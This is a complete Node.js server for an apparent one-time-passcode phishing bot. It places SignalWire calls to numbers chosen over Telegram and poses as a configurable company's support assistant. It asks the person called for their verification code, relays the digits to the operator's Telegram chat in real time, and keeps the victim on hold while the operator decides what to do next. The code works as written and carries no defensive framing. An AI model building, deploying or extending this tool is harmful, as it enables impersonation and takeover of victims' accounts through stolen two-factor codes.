const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// ===== ENV =====
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const SW_PROJECT = process.env.SW_PROJECT;
const SW_TOKEN = process.env.SW_TOKEN;
const SW_SPACE = process.env.SW_SPACE;      // e.g. codesncalls.signalwire.com
const SW_NUMBER = process.env.SW_NUMBER;    // your SignalWire phone number

// ===== STATE =====
let settings = {
  company: "Support",
  digits: 6,
  assistant: "Nova"
};

const assistants = ["Nova","Lyra","Orion","Astra","Kairo"];

let activeCall = null;
let activeCaller = null;
let activeCode = null;
let callStarted = null;

let lastCaller = null;
let callLogs = []; // {caller, code, result, time}

// ===== HELPERS =====
async function tgSend(text, keyboard = null) {
  const body = { chat_id: CHAT_ID, text };
  if (keyboard) body.reply_markup = { inline_keyboard: keyboard };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify(body)
  });
}

async function swUpdateCall(callSid, twiml) {
  const url = `https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${callSid}.json`;

  await fetch(url, {
    method: "POST",
    headers: {
      "Authorization": "Basic " + Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams({ Twiml: twiml })
  });
}

async function swStartCall(to) {
  const url = `https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`;

  await fetch(url, {
    method: "POST",
    headers: {
      "Authorization": "Basic " + Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams({
      To: to,
      From: SW_NUMBER,
      Url: `https://${process.env.RENDER_EXTERNAL_HOSTNAME}/ivr`
    })
  });
}

// ===== ROUTES =====
app.get("/", (req,res)=> res.send("IVR server running"));

// ---- IVR ENTRY ----
app.all("/ivr",(req,res)=>{

  activeCall = req.body.CallSid || req.query.CallSid;
  activeCaller = req.body.From || req.query.From;
  lastCaller = activeCaller;
  callStarted = Date.now();
  activeCode = null;

  res.type("text/xml");

  res.send(`
<Response>
<Gather numDigits="${settings.digits}" action="/code" method="POST">
<Say>Hello this is ${settings.assistant} from ${settings.company}. Please enter your ${settings.digits} digit verification code.</Say>
</Gather>
</Response>
`);
});

// ---- CODE RECEIVED ----
app.all("/code",(req,res)=>{

  const digits = req.body.Digits;
  activeCode = digits;

  tgSend(
`📞 CODE RECEIVED

Caller: ${activeCaller}
Code: ${digits}

Choose action:`,
[
[
{text:"✔ Confirm",callback_data:"confirm"},
{text:"🔁 Ask Again",callback_data:"redo"}
],
[
{text:"⛔ Hang Up",callback_data:"hangup"}
]
]
);

  res.type("text/xml");

  res.send(`
<Response>
<Say>Please hold while we verify your request.</Say>
<Redirect>/hold</Redirect>
</Response>
`);
});

// ---- HOLD LOOP ----
app.all("/hold",(req,res)=>{
  res.type("text/xml");
  res.send(`
<Response>
<Pause length="20"/>
<Redirect>/hold</Redirect>
</Response>
`);
});

// ---- TELEGRAM WEBHOOK ----
app.post("/telegram", async (req,res)=>{

  const data = req.body;

  // BUTTON PRESS
  if (data.callback_query) {
    const action = data.callback_query.data;

    if (action==="confirm" && activeCall) {

      await swUpdateCall(activeCall, `
<Response>
<Say>Thank you. Your request has been verified. Goodbye.</Say>
<Hangup/>
</Response>`);

      callLogs.unshift({
        caller: activeCaller,
        code: activeCode,
        result: "confirmed",
        time: new Date().toISOString()
      });

      callLogs = callLogs.slice(0,10);

      tgSend("✔ Call confirmed and ended.");

    }

    if (action==="redo" && activeCall) {

      await swUpdateCall(activeCall, `
<Response>
<Say>Please enter your code again.</Say>
<Redirect>/ivr</Redirect>
</Response>`);

      tgSend("🔁 Asked caller to enter code again.");

    }

    if (action==="hangup" && activeCall) {

      await swUpdateCall(activeCall, `<Response><Hangup/></Response>`);

      tgSend("⛔ Call ended.");

    }

    return res.sendStatus(200);
  }

  // COMMANDS
  if (data.message && data.message.text) {

    const text = data.message.text.trim();

    if (text.startsWith("/call ")) {
      const num = text.split(" ")[1];
      await swStartCall(num);
      return tgSend(`📞 Calling ${num}`);
    }

    if (text==="/calllast") {
      if (lastCaller) {
        await swStartCall(lastCaller);
        return tgSend(`☎ Calling last caller ${lastCaller}`);
      }
    }

    if (text.startsWith("/company ")) {
      settings.company = text.replace("/company ","");
      return tgSend(`🏢 Company set to ${settings.company}`);
    }

    if (text.startsWith("/digits ")) {
      const n = parseInt(text.replace("/digits ",""));
      if (n>=1 && n<=12) {
        settings.digits = n;
        return tgSend(`🔢 Digit length set to ${n}`);
      }
    }

    if (text==="/assistant") {
      return tgSend(
"🤖 Choose assistant",
assistants.map(a=>[{text:a,callback_data:`assistant_${a}`}])
);
    }

    if (text==="/status") {
      const dur = callStarted ? Math.floor((Date.now()-callStarted)/1000) : 0;
      return tgSend(
`📊 STATUS

Active Caller: ${activeCaller||"None"}
Code: ${activeCode||"None"}
Duration: ${dur}s
Assistant: ${settings.assistant}
Company: ${settings.company}
Digits: ${settings.digits}`
);
    }

    if (text==="/logs") {

      if (!callLogs.length) return tgSend("No logs yet.");

      const logText = callLogs.map((l,i)=>
`${i+1}. ${l.caller}
Code: ${l.code}
Result: ${l.result}`).join("\n\n");

      return tgSend(`📜 LAST CALLS\n\n${logText}`);
    }

  }

  res.sendStatus(200);
});

// ===== START =====
app.listen(process.env.PORT || 3000);
